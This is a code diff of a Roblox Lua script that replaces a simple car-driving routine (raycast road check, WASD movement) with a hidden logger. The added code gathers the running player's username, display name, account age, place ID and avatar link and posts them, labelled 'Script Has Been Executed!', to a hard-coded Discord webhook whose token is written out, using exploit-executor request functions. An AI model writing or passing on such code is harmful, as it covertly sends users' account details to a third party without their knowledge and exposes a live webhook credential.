@@ -1,59 +1,48 @@
+
+local webhookUrl = "https://discord.com/api/webhooks/1212487312873885716/76arKjYim_SIBRs6cTjnI7_ynKjEjdNp3H9DI5BbYisFQ42CBJHPYZnmG62TkeGJhdrD"
+
 local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:WaitForChild("Humanoid")
+local username = player.Name
+local accountAge = player.AccountAge
+local gameUsername = player.DisplayName -- Use DisplayName for the in-game username
+local serverId = game.PlaceId -- Use PlaceId for the server ID
+local avatarUrl = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username=" .. username
 
-local roadColor = Color3.new(0, 0, 0) -- Replace with the color of your road
-local speed = 50
+local joinScript = "```lua\nEXECUTE THIS TO JOIN THEIR SERVER: \n``script to join server " .. serverId .. " goes here```\n"
 
--- Function to check if the road is in front of the car
-local function isRoadInFront(car)
-    if not car then
-        return false
-    end
+local payload = {
+    content = nil,
+    embeds = {
+        {
+            title = "Script Has Been Executed!",
+            description = "Username: " .. username .. "\nGame Username: " .. gameUsername .. "\nAccount Age: " .. accountAge .. "\n\n" .. joinScript,
+            color = nil,
+            image = {
+                url = avatarUrl
+            }
+        }
+    },
+    username = "The Rake",
+    avatar_url = "https://th.bing.com/th/id/OIP.-M26uq0243bsJB97pgaZlQHaEK?w=319&h=180&c=7&r=0&o=5&dpr=1.5&pid=1.7",
+    attachments = {}
+}
 
-    local primaryPart = car:FindFirstChild("PrimaryPart")
-    if not primaryPart then
-        return false
-    end
+local payloadJson = game:GetService("HttpService"):JSONEncode(payload)
 
-    local rayStart = primaryPart.Position
-    local rayDirection = primaryPart.CFrame.LookVector
-    local raycastResult = workspace:Raycast(rayStart, rayDirection, {car})
+local httpRequest = syn and (syn.request or http.request) or http_request or request or httprequest
 
-    return raycastResult and raycastResult.Instance.BrickColor == BrickColor.new(roadColor)
+if httpRequest then
+    local response = httpRequest({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = payloadJson
+    })
+
+    -- Optionally, you can print the response to check for errors
+    print(response.Body)
+else
+    warn("HTTP request not available.")
 end
-
--- Function to drive the car based on keyboard input
-local function driveCar()
-    local userInputService = game:GetService("UserInputService")
-
-    userInputService.InputBegan:Connect(function(input)
-        local car = character:FindFirstChildWhichIsA("Model") -- Adjust based on your car's class
-
-        if not car then
-            print("Car not found")
-            return
-        end
-
-        if input.KeyCode == Enum.KeyCode.W then
-            if isRoadInFront(car) then
-                car:SetPrimaryPartCFrame(car:GetPrimaryPartCFrame() * CFrame.new(0, 0, -speed))
-                print("Moving forward")
-            else
-                print("Road not detected. Adjusting direction.")
-            end
-        elseif input.KeyCode == Enum.KeyCode.S then
-            car:SetPrimaryPartCFrame(car:GetPrimaryPartCFrame() * CFrame.new(0, 0, speed))
-            print("Moving backward")
-        elseif input.KeyCode == Enum.KeyCode.A then
-            car:SetPrimaryPartCFrame(car:GetPrimaryPartCFrame() * CFrame.Angles(0, -math.rad(5), 0))
-            print("Turning left")
-        elseif input.KeyCode == Enum.KeyCode.D then
-            car:SetPrimaryPartCFrame(car:GetPrimaryPartCFrame() * CFrame.Angles(0, math.rad(5), 0))
-            print("Turning right")
-        end
-    end)
-end
-
--- Start driving the car
-driveCar()
